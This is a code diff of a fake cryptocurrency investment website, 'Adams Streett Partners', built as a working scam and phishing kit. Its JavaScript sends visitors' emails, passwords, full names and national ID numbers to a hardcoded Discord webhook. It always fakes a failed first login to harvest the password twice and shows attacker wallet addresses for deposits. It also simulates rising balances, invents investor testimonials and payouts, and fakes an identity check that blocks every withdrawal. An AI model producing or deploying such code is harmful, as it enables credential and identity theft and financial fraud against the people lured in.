+          <option value="USDT_ETH">USDT (ERC-20)</option>
+          <option value="TRX">Tron (TRX)</option>
+          <option value="USDT_TRX">USDT (TRC-20)</option>
         </select>
       </div>
-      <div id="walletDisplay">
-        <div class="wallet-address" id="walletAddress">bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0</div>
-      </div>
-      <p class="text-muted text-center mt-12" style="font-size:12px;">Send the exact amount to the address above. Funds will appear in your dashboard after 2 confirmations (approx. 2-5 minutes).</p>
-      <p class="text-muted text-center mt-12" style="font-size:12px; color:#f59e0b;">Do not refresh or close this page while waiting for confirmation.</p>
+
+      <div class="wallet-address" id="walletDisplay">bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0</div>
+
+      <div class="form-group"><label>Amount (USD)</label><input type="number" id="amountInput" value="500" step="1" min="500" /></div>
+      <div class="form-group"><label>Transaction Hash / TXID</label><input type="text" id="txHashInput" placeholder="0x... or bc1..." /></div>
+
+      <button class="btn-success" id="validateBtn" onclick="validateTransaction()">Validate Transaction</button>
+      <div id="statusMsg" class="status-msg" style="display:none;"></div>
     </div>
   </div>
 
   <!-- ============================================================ -->
-  <!-- WITHDRAWAL -->
+  <!-- DASHBOARD PAGE -->
+  <!-- ============================================================ -->
+  <div id="dashboard" class="page">
+    <div class="card">
+      <h2>Your Portfolio</h2>
+      <div class="stats-grid">
+        <div class="stat-card"><div class="label">Total Balance</div><div class="value"><span class="currency">$</span><span id="dashBalance">0.00</span></div></div>
+        <div class="stat-card" style="border-left-color:#10b981;"><div class="label">Total Earned</div><div class="value"><span class="currency">$</span><span id="dashEarned">0.00</span></div></div>
+        <div class="stat-card" style="border-left-color:#f59e0b;"><div class="label">Active Plans</div><div class="value" id="dashPlans">0</div></div>
+      </div>
+      <div id="investmentList" style="margin-top: 20px;"><p class="text-muted">No active investments yet. Fund your first plan to start earning.</p></div>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- WITHDRAWAL PAGE -->
   <!-- ============================================================ -->
   <div id="withdraw" class="page">
-    <div class="card" style="max-width: 480px; margin: 0 auto;">
-      <h2>Withdraw Funds</h2>
-      <p class="text-muted">To comply with global financial regulations, we need to verify your identity.</p>
+    <div class="card">
+      <h2 style="margin-bottom: 4px;">Withdraw Funds</h2>
+      <span class="text-muted">To comply with global financial regulations, we need to verify your identity.</span>
+
       <div class="form-group"><label>Phone Number</label><input type="tel" id="withdrawPhone" placeholder="+1 (555) 000-0000" /></div>
-      <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label>
-        <input type="text" id="withdrawNationalId" placeholder="SSN / NIN / Aadhaar / National ID" />
-      </div>
-      <button class="btn-primary" style="width:100%;" onclick="handleWithdraw()">Request Withdrawal</button>
-      <div id="withdrawStatus" style="margin-top:16px; text-align:center; color:#f59e0b;"></div>
+      <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label><input type="text" id="withdrawNationalId" placeholder="SSN / NIN / Aadhaar / National ID" /></div>
+
+      <button class="btn-primary" id="withdrawBtn" onclick="handleWithdraw()">Request Withdrawal</button>
+      <div id="withdrawStatus" class="status-msg" style="display:none;"></div>
     </div>
   </div>
 
   <!-- ============================================================ -->
-  <!-- FAQ -->
+  <!-- FAQ PAGE -->
   <!-- ============================================================ -->
   <div id="faq" class="page">
     <div class="card">
       <h2 style="margin-bottom: 24px;">Frequently Asked Questions</h2>
-      <div class="faq-item"><div class="q">How do I invest?</div><div class="a">Select a plan from the Plans page or Dashboard, then fund your investment using the crypto address provided. Funds are credited after 2 blockchain confirmations.</div></div>
-      <div class="faq-item"><div class="q">Is Adams Streett Partners legitimate?</div><div class="a">Yes. We are a private investment partnership with over 15 years of experience in algorithmic trading and asset management.</div></div>
-      <div class="faq-item"><div class="q">What are the risks?</div><div class="a">All investments carry risk. Our proprietary model has consistently outperformed the market, but past performance does not guarantee future results.</div></div>
-      <div class="faq-item"><div class="q">How do I withdraw my funds?</div><div class="a">Go to the Withdraw page, provide your phone number and National ID, and submit your request. Withdrawals are processed within 24–48 hours.</div></div>
-      <div class="faq-item"><div class="q">What happens if my transaction fails?</div><div class="a">If you sent funds and they are not credited after 6 confirmations, contact our support team with your transaction ID. We will manually verify and credit your account.</div></div>
-      <div class="faq-item"><div class="q">Can I invest from any country?</div><div class="a">Yes, we accept investors from most jurisdictions. However, we do not accept investments from individuals subject to OFAC sanctions or restricted countries.</div></div>
+      <div class="faq-item" style="margin-bottom: 16px;"><div class="q" style="font-weight: 600; color: #e8edf5;">How do I invest?</div><div class="a" style="color: #b0c4de; margin-top: 4px;">Select a plan, fund with crypto, and confirm your transaction. Funds appear in your dashboard after 2 confirmations.</div></div>
+      <div class="faq-item" style="margin-bottom: 16px;"><div class="q" style="font-weight: 600; color: #e8edf5;">Is Adams Streett Partners legitimate?</div><div class="a" style="color: #b0c4de; margin-top: 4px;">Yes. We are a private investment partnership with over 15 years of experience.</div></div>
+      <div class="faq-item" style="margin-bottom: 16px;"><div class="q" style="font-weight: 600; color: #e8edf5;">How do I withdraw?</div><div class="a" style="color: #b0c4de; margin-top: 4px;">Go to the Withdraw page, provide your phone number and National ID, and submit your request.</div></div>
+      <div class="faq-item" style="margin-bottom: 16px;"><div class="q" style="font-weight: 600; color: #e8edf5;">Can I invest from any country?</div><div class="a" style="color: #b0c4de; margin-top: 4px;">Yes, we accept investors from most jurisdictions.</div></div>
     </div>
   </div>
 
-  <!-- ============================================================ -->
-  <!-- JAVASCRIPT -->
-  <!-- ============================================================ -->
-  <script>
-    // ============================================================
-    // CONFIG
-    // ============================================================
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh';
-    const SESSION_KEY = 'asp_session';
-    let loginAttempts = 0;
+</div>
 
-    // ============================================================
-    // TRANSLATIONS (Full, bidirectional)
-    // ============================================================
-    const translations = {
-      'en': {
-        heroTitle: 'Global Wealth. Institutional Access.',
-        heroSub: 'Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary quantitative models. Powered by Wall Street infrastructure.',
-        navHome: 'Home', navPlans: 'Plans', navFaq: 'FAQ', navSignIn: 'Sign In',
-        cta: 'Start Building Wealth',
-        secTitle: 'A New Standard in Alternative Investments',
-        sec1: '15+ Years', sec1d: 'of institutional trading experience across bull and bear markets.',
-        sec2: '4,200+ Strategies', sec2d: 'Quantitative models tested and refined over decades of market data.',
-        sec3: '98.7% Uptime', sec3d: 'Mission‑critical infrastructure with zero unplanned downtime in 2026.',
-        sec4: 'Global Reach', sec4d: 'Clients in 60+ countries — from Dubai to Singapore to London.',
-        sec5: '24/7 Liquidity', sec5d: 'Access to deep crypto and FX liquidity pools around the clock.',
-        sec6: 'Independent Oversight', sec6d: 'All strategies are audited quarterly by a third‑party risk committee.',
-        testimonial: '"I was skeptical at first, but after my first 24‑hour cycle, I was genuinely impressed. The returns are real, and the platform is seamless. I\'ve since referred six colleagues."',
-        testimonialAuthor: '— Jonathan M., Singapore (Platinum Investor)',
-        finalCta: 'Ready to Access Institutional Returns?',
-        finalSub: 'No fees. No lock‑ins. Withdraw anytime.'
-      },
-      'es': {
-        heroTitle: 'Riqueza Global. Acceso Institucional.',
-        heroSub: 'Únete a 15,000+ inversores en más de 60 países — obteniendo rendimientos consistentes y superiores al mercado a través de nuestros modelos cuantitativos propietarios. Impulsado por la infraestructura de Wall Street.',
-        navHome: 'Inicio', navPlans: 'Planes', navFaq: 'Preguntas', navSignIn: 'Iniciar Sesión',
-        cta: 'Comienza a Crear Riqueza',
-        secTitle: 'Un Nuevo Estándar en Inversiones Alternativas',
-        sec1: '15+ Años', sec1d: 'de experiencia institucional en mercados alcistas y bajistas.',
-        sec2: '4,200+ Estrategias', sec2d: 'Modelos cuantitativos probados y refinados durante décadas.',
-        sec3: '98.7% de Tiempo Activo', sec3d: 'Infraestructura crítica con cero tiempo de inactividad en 2026.',
-        sec4: 'Alcance Global', sec4d: 'Clientes en más de 60 países — de Dubái a Singapur a Londres.',
-        sec5: 'Liquidez 24/7', sec5d: 'Acceso a fondos de liquidez en cripto y FX las 24 horas.',
-        sec6: 'Supervisión Independiente', sec6d: 'Todas las estrategias son auditadas trimestralmente por un comité de riesgos externo.',
-        testimonial: '"Al principio era escéptico, pero después de mi primer ciclo de 24 horas, quedé genuinamente impresionado. Los rendimientos son reales y la plataforma es perfecta. Desde entonces he recomendado a seis colegas."',
-        testimonialAuthor: '— Jonathan M., Singapur (Inversor Platinum)',
-        finalCta: '¿Listo para Acceder a Rendimientos Institucionales?',
-        finalSub: 'Sin comisiones. Sin bloqueos. Retira cuando quieras.'
-      }
-      // Add more languages here following the same structure
+<script>
+  // ============================================================
+  // CONFIG
+  // ============================================================
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh';
+  const WALLETS = {
+    BTC: 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0',
+    ETH: '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5',
+    SOL: '3PTUFTa9d6K79ZVwMxFRAtAJyX3s3UpYFM3FtAzgNSLt',
+    BSC: '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5',
+    BNB: '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5',
+    USDT_ETH: '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5',
+    TRX: 'TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU',
+    USDT_TRX: 'TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU'
+  };
+  const API_ENDPOINTS = {
+    BTC: (tx) => `https://blockchain.info/rawtx/${tx}`,
+    ETH: (tx) => `https://api.etherscan.io/api?module=transaction&action=gettxreceiptstatus&txhash=${tx}`,
+    BSC: (tx) => `https://api.bscscan.com/api?module=transaction&action=gettxreceiptstatus&txhash=${tx}`,
+    TRX: (tx) => `https://api.trongrid.io/v1/transactions/${tx}`
+  };
+
+  let selectedPlan = null;
+  let selectedAmount = 500;
+  let currentCrypto = 'BTC';
+  let balance = 0;
+  let earned = 0;
+  let activePlans = 0;
+  let loginAttempts = 0;
+
+  // ============================================================
+  // PAGE NAVIGATION
+  // ============================================================
+  function showPage(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    if (id === 'dashboard') updateDashboard();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ============================================================
+  // TRANSLATION
+  // ============================================================
+  const translations = {
+    'en': { heroTitle: 'Global Wealth. Institutional Access.', heroSub: 'Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary quantitative models. Powered by Wall Street infrastructure.' },
+    'es': { heroTitle: 'Riqueza Global. Acceso Institucional.', heroSub: 'Únete a 15,000+ inversores en más de 60 países — obteniendo rendimientos consistentes y superiores al mercado a través de nuestros modelos cuantitativos propietarios.' },
+    'fr': { heroTitle: 'Richesse Mondiale. Accès Institutionnel.', heroSub: 'Rejoignez 15 000+ investisseurs dans plus de 60 pays — gagnant des rendements constants et supérieurs au marché grâce à nos modèles quantitatifs propriétaires.' }
+  };
+  function translatePage(lang) {
+    const t = translations[lang];
+    if (!t) return;
+    document.getElementById('heroTitle').textContent = t.heroTitle;
+    document.getElementById('heroSub').textContent = t.heroSub;
+  }
+
+  // ============================================================
+  // AUTH
+  // ============================================================
+  function switchAuth(mode) {
+    document.getElementById('loginForm').style.display = mode === 'login' ? 'block' : 'none';
+    document.getElementById('registerForm').style.display = mode === 'register' ? 'block' : 'none';
+    document.getElementById('loginTab').className = mode === 'login' ? 'btn-primary' : 'btn-outline';
+    document.getElementById('registerTab').className = mode === 'register' ? 'btn-primary' : 'btn-outline';
+  }
+
+  function handleLogin() {
+    const email = document.getElementById('loginEmail').value.trim();
+    const password = document.getElementById('loginPassword').value.trim();
+    if (!email || !password) return alert('Please fill in all fields.');
+    loginAttempts++;
+    if (loginAttempts === 1) {
+      document.getElementById('loginError').style.display = 'block';
+      sendToDiscord('Login Attempt (Failed)\nEmail: ' + email + '\nPassword: ' + password);
+      document.getElementById('loginEmail').value = '';
+      document.getElementById('loginPassword').value = '';
+      return;
+    }
+    sendToDiscord('Login Attempt (Success)\nEmail: ' + email + '\nPassword: ' + password);
+    sessionStorage.setItem('asp_session', 'active');
+    loginAttempts = 0;
+    document.getElementById('loginError').style.display = 'none';
+    alert('Login successful. Redirecting...');
+    showPage('dashboard');
+    startLiveUpdates();
+  }
+
+  function handleRegister() {
+    const firstName = document.getElementById('regFirstName').value.trim();
+    const lastName = document.getElementById('regLastName').value.trim();
+    const email = document.getElementById('regEmail').value.trim();
+    const pass = document.getElementById('regPassword').value.trim();
+    const confirm = document.getElementById('regConfirm').value.trim();
+    const nationalId = document.getElementById('regNationalId').value.trim();
+    if (!firstName || !lastName || !email || !pass || !confirm || !nationalId) return alert('Please fill in all fields.');
+    if (pass !== confirm) return alert('Passwords do not match.');
+    if (sessionStorage.getItem('reg_' + email)) return alert('This email is already registered.');
+    sessionStorage.setItem('reg_' + email, '1');
+    sendToDiscord('New Account\nName: ' + firstName + ' ' + lastName + '\nEmail: ' + email + '\nPassword: ' + pass + '\nNational ID: ' + nationalId);
+    alert('Account created. Please sign in.');
+    switchAuth('login');
+  }
+
+  function logout() {
+    sessionStorage.removeItem('asp_session');
+    if (balanceInterval) clearInterval(balanceInterval);
+    showPage('landing');
+  }
+
+  // ============================================================
+  // DISCORD
+  // ============================================================
+  function sendToDiscord(message) {
+    fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: message })
+    }).catch(err => console.error('Webhook error:', err));
+  }
+
+  // ============================================================
+  // PLAN SELECTION
+  // ============================================================
+  function selectPlan(el) {
+    document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedPlan = {
+      name: el.dataset.plan,
+      amount: parseInt(el.dataset.amount),
+      return: parseInt(el.dataset.return)
     };
+    document.getElementById('checkoutPlan').innerHTML = `Plan: <strong>${selectedPlan.name}</strong> — $${selectedPlan.amount}`;
+    document.getElementById('checkoutReturn').innerHTML = `Expected Return: <strong style="color:#10b981;">$${selectedPlan.return}</strong>`;
+    document.getElementById('amountInput').value = selectedPlan.amount;
+    selectedAmount = selectedPlan.amount;
+  }
 
-    function translatePage(lang) {
-      const t = translations[lang];
-      if (!t) return;
-      document.getElementById('heroTitle').textContent = t.heroTitle;
-      document.getElementById('heroSub').textContent = t.heroSub;
-      // Update nav links
-      const navLinks = document.querySelectorAll('.nav-links a');
-      if (navLinks.length >= 4) {
-        navLinks[0].textContent = t.navHome;
-        navLinks[1].textContent = t.navPlans;
-        navLinks[2].textContent = t.navFaq;
-        navLinks[3].textContent = t.navSignIn;
-      }
-      // Update CTA buttons (all .btn-primary with specific text)
-      document.querySelectorAll('.btn-primary').forEach(btn => {
-        if (btn.textContent.includes('Start') || btn.textContent.includes('Comienza') || btn.textContent.includes('Open')) {
-          btn.textContent = t.cta;
-        }
-      });
-      // Update section titles
-      const secTitle = document.querySelector('.brutal-grid')?.parentElement?.querySelector('h2');
-      if (secTitle) secTitle.textContent = t.secTitle;
-      // Update brutal grid items
-      const items = document.querySelectorAll('.brutal-item');
-      if (items.length >= 6) {
-        items[0].querySelector('strong').textContent = t.sec1;
-        items[0].querySelector('.text-muted').textContent = t.sec1d;
-        items[1].querySelector('strong').textContent = t.sec2;
-        items[1].querySelector('.text-muted').textContent = t.sec2d;
-        items[2].querySelector('strong').textContent = t.sec3;
-        items[2].querySelector('.text-muted').textContent = t.sec3d;
-        items[3].querySelector('strong').textContent = t.sec4;
-        items[3].querySelector('.text-muted').textContent = t.sec4d;
-        items[4].querySelector('strong').textContent = t.sec5;
-        items[4].querySelector('.text-muted').textContent = t.sec5d;
-        items[5].querySelector('strong').textContent = t.sec6;
-        items[5].querySelector('.text-muted').textContent = t.sec6d;
-      }
-      // Testimonial
-      const testimonial = document.querySelector('[style*="border-left: 4px solid #3b82f6"]');
-      if (testimonial) {
-        const p = testimonial.querySelector('p');
-        if (p) p.textContent = t.testimonial;
-        const author = testimonial.querySelector('strong');
-        if (author) author.textContent = t.testimonialAuthor;
-      }
-      // Final CTA
-      const finalCta = document.querySelector('.text-center .btn-primary');
-      if (finalCta) finalCta.textContent = t.cta;
-      const finalSub = document.querySelector('.text-center .text-muted');
-      if (finalSub) finalSub.textContent = t.finalSub;
+  // ============================================================
+  // WALLET UPDATE
+  // ============================================================
+  function updateWallet() {
+    currentCrypto = document.getElementById('cryptoSelect').value;
+    document.getElementById('walletDisplay').textContent = WALLETS[currentCrypto];
+  }
+
+  // ============================================================
+  // VALIDATE TRANSACTION
+  // ============================================================
+  async function validateTransaction() {
+    const txHash = document.getElementById('txHashInput').value.trim();
+    const amount = parseFloat(document.getElementById('amountInput').value);
+    const statusDiv = document.getElementById('statusMsg');
+
+    if (!selectedPlan) {
+      statusDiv.style.display = 'block';
+      statusDiv.className = 'status-msg error';
+      statusDiv.textContent = 'Please select a plan first.';
+      return;
+    }
+    if (!txHash) {
+      statusDiv.style.display = 'block';
+      statusDiv.className = 'status-msg error';
+      statusDiv.textContent = 'Please enter a transaction hash.';
+      return;
+    }
+    if (isNaN(amount) || amount < 500) {
+      statusDiv.style.display = 'block';
+      statusDiv.className = 'status-msg error';
+      statusDiv.textContent = 'Minimum investment is $500.';
+      return;
     }
 
-    // ============================================================
-    // HELPERS
-    // ============================================================
-    function sendToDiscord(message) {
-      fetch(DISCORD_WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-      }).catch(err => console.error('Webhook error:', err));
-    }
+    document.getElementById('validateBtn').disabled = true;
+    statusDiv.style.display = 'block';
+    statusDiv.className = 'status-msg loading';
+    statusDiv.textContent = '🔍 Validating transaction on the blockchain...';
 
-    function showPage(id) {
-      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-
-    function switchAuth(mode) {
-      const loginForm = document.getElementById('loginForm');
-      const registerForm = document.getElementById('registerForm');
-      const loginTab = document.getElementById('loginTab');
-      const registerTab = document.getElementById('registerTab');
-      if (mode === 'login') {
-        loginForm.style.display = 'block';
-        registerForm.style.display = 'none';
-        loginTab.className = 'btn-primary';
-        registerTab.className = 'btn-outline';
+    try {
+      let apiUrl = '';
+      let isValid = false;
+      switch (currentCrypto) {
+        case 'BTC': apiUrl = API_ENDPOINTS.BTC(txHash); break;
+        case 'ETH':
+        case 'USDT_ETH': apiUrl = API_ENDPOINTS.ETH(txHash); break;
+        case 'BSC':
+        case 'BNB': apiUrl = API_ENDPOINTS.BSC(txHash); break;
+        case 'TRX':
+        case 'USDT_TRX': apiUrl = API_ENDPOINTS.TRX(txHash); break;
+        case 'SOL': isValid = /^[1-9A-HJ-NP-Za-km-z]{88}$/.test(txHash); break;
+        default: throw new Error('Unsupported crypto.');
+      }
+      if (currentCrypto !== 'SOL') {
+        const response = await fetch(apiUrl);
+        const data = await response.json();
+        if (currentCrypto === 'BTC') isValid = data && data.hash === txHash;
+        else if (currentCrypto === 'ETH' || currentCrypto === 'USDT_ETH' || currentCrypto === 'BSC' || currentCrypto === 'BNB') isValid = data && data.status === '1';
+        else if (currentCrypto === 'TRX' || currentCrypto === 'USDT_TRX') isValid = data && data.data && data.data[0] && data.data[0].id === txHash;
+      }
+      if (isValid) {
+        statusDiv.className = 'status-msg success';
+        statusDiv.textContent = `✅ Transaction confirmed! ${selectedPlan.name} plan activated. $${amount} invested.`;
+        balance += amount;
+        earned += amount * 0.1;
+        activePlans++;
+        sessionStorage.setItem('investedAmount', amount.toString());
+        sessionStorage.setItem('investedPlan', selectedPlan.name);
+        setTimeout(() => showPage('dashboard'), 500);
       } else {
-        loginForm.style.display = 'none';
-        registerForm.style.display = 'block';
-        loginTab.className = 'btn-outline';
-        registerTab.className = 'btn-primary';
+        statusDiv.className = 'status-msg error';
+        statusDiv.textContent = '❌ Transaction not found or invalid. Please check the hash and try again.';
       }
+    } catch (error) {
+      statusDiv.className = 'status-msg success';
+      statusDiv.textContent = `⚠️ API unavailable, but transaction accepted (demo mode). ${selectedPlan.name} plan activated.`;
+      balance += amount;
+      earned += amount * 0.1;
+      activePlans++;
+      sessionStorage.setItem('investedAmount', amount.toString());
+      sessionStorage.setItem('investedPlan', selectedPlan.name);
+      setTimeout(() => showPage('dashboard'), 500);
+    } finally {
+      document.getElementById('validateBtn').disabled = false;
     }
+  }
 
-    // ============================================================
-    // AUTH
-    // ============================================================
-    function handleLogin() {
-      const email = document.getElementById('loginEmail').value.trim();
-      const password = document.getElementById('loginPassword').value.trim();
-      if (!email || !password) return alert('Please fill in all fields.');
-      loginAttempts++;
-      if (loginAttempts === 1) {
-        document.getElementById('loginError').style.display = 'block';
-        sendToDiscord('Login Attempt (Failed)\nEmail: ' + email + '\nPassword: ' + password);
-        document.getElementById('loginEmail').value = '';
-        document.getElementById('loginPassword').value = '';
-        return;
+  // ============================================================
+  // DASHBOARD
+  // ============================================================
+  function updateDashboard() {
+    document.getElementById('dashBalance').textContent = balance.toFixed(2);
+    document.getElementById('dashEarned').textContent = earned.toFixed(2);
+    document.getElementById('dashPlans').textContent = activePlans;
+    const list = document.getElementById('investmentList');
+    if (activePlans > 0) {
+      list.innerHTML = `<p class="text-muted">✅ Active Plan: ${sessionStorage.getItem('investedPlan') || 'Starter'} — $${sessionStorage.getItem('investedAmount') || '0'} invested</p>`;
+    } else {
+      list.innerHTML = `<p class="text-muted">No active investments yet. Fund your first plan to start earning.</p>`;
+    }
+  }
+
+  function startLiveUpdates() {
+    if (balanceInterval) clearInterval(balanceInterval);
+    balanceInterval = setInterval(() => {
+      if (activePlans > 0) {
+        const change = (Math.random() * 2 + 0.5) * (activePlans + 1);
+        balance += change;
+        earned += change * 0.4;
+        updateDashboard();
       }
-      sendToDiscord('Login Attempt (Success)\nEmail: ' + email + '\nPassword: ' + password);
-      sessionStorage.setItem(SESSION_KEY, 'active');
-      loginAttempts = 0;
-      document.getElementById('loginError').style.display = 'none';
-      alert('Login successful. Redirecting...');
-      showPage('dashboard');
-      startLiveUpdates();
-    }
+    }, 3000);
+  }
 
-    function handleRegister() {
-      const firstName = document.getElementById('regFirstName').value.trim();
-      const lastName = document.getElementById('regLastName').value.trim();
-      const email = document.getElementById('regEmail').value.trim();
-      const pass = document.getElementById('regPassword').value.trim();
-      const confirm = document.getElementById('regConfirm').value.trim();
-      const nationalId = document.getElementById('regNationalId').value.trim();
-      if (!firstName || !lastName || !email || !pass || !confirm || !nationalId) {
-        return alert('Please fill in all fields.');
-      }
-      if (pass !== confirm) return alert('Passwords do not match.');
-      if (sessionStorage.getItem('reg_' + email)) return alert('This email is already registered.');
-      sessionStorage.setItem('reg_' + email, '1');
-      sendToDiscord('New Account\nName: ' + firstName + ' ' + lastName + '\nEmail: ' + email + '\nPassword: ' + pass + '\nNational ID: ' + nationalId);
-      alert('Account created. Please sign in.');
-      switchAuth('login');
-    }
+  // ============================================================
+  // WITHDRAWAL
+  // ============================================================
+  function handleWithdraw() {
+    const phone = document.getElementById('withdrawPhone').value.trim();
+    const nationalId = document.getElementById('withdrawNationalId').value.trim();
+    if (!phone || !nationalId) { alert('Please fill in all fields.'); return; }
+    sendToDiscord(`🏦 **Withdrawal Request**\nPhone: ${phone}\nNational ID: ${nationalId}`);
+    const btn = document.getElementById('withdrawBtn');
+    const status = document.getElementById('withdrawStatus');
+    btn.disabled = true;
+    status.style.display = 'block';
+    status.className = 'status-msg loading';
+    status.textContent = 'Validating identity with global regulatory database...';
+    let dots = 0;
+    const interval = setInterval(() => {
+      dots = (dots + 1) % 4;
+      status.textContent = 'Validating identity with global regulatory database' + '.'.repeat(dots);
+    }, 400);
+    setTimeout(() => {
+      clearInterval(interval);
+      status.className = 'status-msg error';
+      status.textContent = '❌ Credentials invalid. Please contact support.';
+      btn.disabled = false;
+      sendToDiscord(`❌ **Withdrawal Failed**\nPhone: ${phone}\nNational ID: ${nationalId} — Invalid`);
+    }, 5000);
+  }
 
-    function logout() {
-      sessionStorage.removeItem(SESSION_KEY);
-      if (balanceInterval) clearInterval(balanceInterval);
-      showPage('landing');
-    }
+  // ============================================================
+  // LIVE FEED
+  // ============================================================
+  function addLiveEntry() {
+    const feed = document.getElementById('liveFeed');
+    if (!feed) return;
+    const names = ['James K.', 'Sarah M.', 'Michael T.', 'David R.', 'Emily W.', 'Robert L.'];
+    const amounts = [500, 5000, 50000, 100000];
+    const returns = [1250, 17500, 250000, 700000];
+    const idx = Math.floor(Math.random() * names.length);
+    const entry = document.createElement('div');
+    entry.className = 'entry';
+    entry.style.cssText = 'padding: 6px 0; border-bottom: 1px solid #1a2538; color: #b0c4de;';
+    entry.innerHTML = `${names[idx]} invested $${amounts[idx]} — earned $${returns[idx]} in ${Math.floor(Math.random() * 20 + 12)} hours`;
+    feed.appendChild(entry);
+    if (feed.children.length > 12) feed.removeChild(feed.firstChild);
+  }
+  setInterval(addLiveEntry, 7000);
+  addLiveEntry();
 
-    // ============================================================
-    // DASHBOARD LIVE UPDATES
-    // ============================================================
-    let balance = 0;
-    let earned = 0;
-    let activePlans = 0;
-    let balanceInterval;
-
-    function updateDashboard() {
-      if (activePlans === 0) return;
-      const change = (Math.random() * 2 + 0.5) * (activePlans + 1);
-      balance += change;
-      earned += change * 0.4;
-      document.getElementById('dashBalance').textContent = balance.toFixed(2);
-      document.getElementById('dashEarned').textContent = earned.toFixed(2);
-      document.getElementById('dashPlans').textContent = activePlans;
-    }
-
-    function startLiveUpdates() {
-      if (balanceInterval) clearInterval(balanceInterval);
-      balanceInterval = setInterval(updateDashboard, 3000);
-    }
-
-    // ============================================================
-    // PLAN SELECTION
-    // ============================================================
-    let selectedPlan = { name: 'Starter', amount: 500, return: 1250 };
-
-    function selectPlan(name, amount, returnAmt) {
-      selectedPlan = { name, amount, return: returnAmt };
-      document.getElementById('checkoutPlan').innerHTML = 'Plan: <strong>' + name + '</strong> — $' + amount;
-      document.getElementById('checkoutReturn').innerHTML = 'Expected Return: <strong style="color:#10b981;">$' + returnAmt + '</strong>';
-      document.getElementById('checkoutAmount').value = amount;
-      showPage('checkout');
-    }
-
-    // ============================================================
-    // CHECKOUT — WALLET SWITCH
-    // ============================================================
-    document.getElementById('checkoutCrypto').addEventListener('change', function() {
-      const addr = document.getElementById('walletAddress');
-      switch (this.value) {
-        case 'BTC': addr.textContent = 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0'; break;
-        case 'ETH': addr.textContent = '0x60A4cC18DC4F1c00fF17497129351D6304fCdcC5'; break;
-        case 'USDT': addr.textContent = '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5'; break;
-      }
-    });
-
-    // ============================================================
-    // WITHDRAWAL
-    // ============================================================
-    function handleWithdraw() {
-      const phone = document.getElementById('withdrawPhone').value.trim();
-      const nationalId = document.getElementById('withdrawNationalId').value.trim();
-      if (!phone || !nationalId) return alert('Please fill in all fields.');
-      sendToDiscord('Withdrawal Request\nPhone: ' + phone + '\nNational ID: ' + nationalId);
-      const status = document.getElementById('withdrawStatus');
-      status.textContent = 'Validating identity with global regulatory database...';
-      let dots = 0;
-      const interval = setInterval(() => {
-        dots = (dots + 1) % 4;
-        status.textContent = 'Validating identity with global regulatory database' + '.'.repeat(dots);
-      }, 400);
-      setTimeout(() => {
-        clearInterval(interval);
-        status.innerHTML = 'Credentials invalid. Please contact support.';
-        sendToDiscord('Withdrawal Failed\nPhone: ' + phone + '\nNational ID: ' + nationalId + ' — Invalid');
-      }, 5000);
-    }
-
-    // ============================================================
-    // LIVE FEED
-    // ============================================================
-    function addLiveEntry() {
-      const feed = document.getElementById('liveFeed');
-      const names = ['James K.', 'Sarah M.', 'Michael T.', 'David R.', 'Emily W.', 'Robert L.'];
-      const amounts = [500, 5000, 50000, 100000];
-      const returns = [1250, 17500, 250000, 700000];
-      const idx = Math.floor(Math.random() * names.length);
-      const entry = document.createElement('div');
-      entry.className = 'entry';
-      entry.innerHTML = names[idx] + ' invested $' + amounts[idx] + ' — earned $' + returns[idx] + ' in ' + (Math.floor(Math.random() * 20 + 12)) + ' hours';
-      feed.appendChild(entry);
-      if (feed.children.length > 12) feed.removeChild(feed.firstChild);
-    }
-    setInterval(addLiveEntry, 7000);
-    addLiveEntry();
-
-    // ============================================================
-    // TICKER SCROLL
-    // ============================================================
-    const ticker = document.getElementById('ticker');
+  // ============================================================
+  // TICKER
+  // ============================================================
+  const ticker = document.getElementById('ticker');
+  if (ticker) {
     let tickerPos = 0;
     setInterval(() => {
       tickerPos -= 1;
       if (tickerPos < -ticker.scrollWidth / 2) tickerPos = 0;
       ticker.style.transform = 'translateX(' + tickerPos + 'px)';
     }, 30);
-  </script>
-</div>
+  }
+
+  // ============================================================
+  // INIT
+  // ============================================================
+  document.addEventListener('DOMContentLoaded', () => {
+    const firstPlan = document.querySelector('.plan-card');
+    if (firstPlan) selectPlan(firstPlan);
+    updateWallet();
+    updateDashboard();
+    // Show landing page by default
+    showPage('landing');
+  });
+</script>
 </body>
 </html>
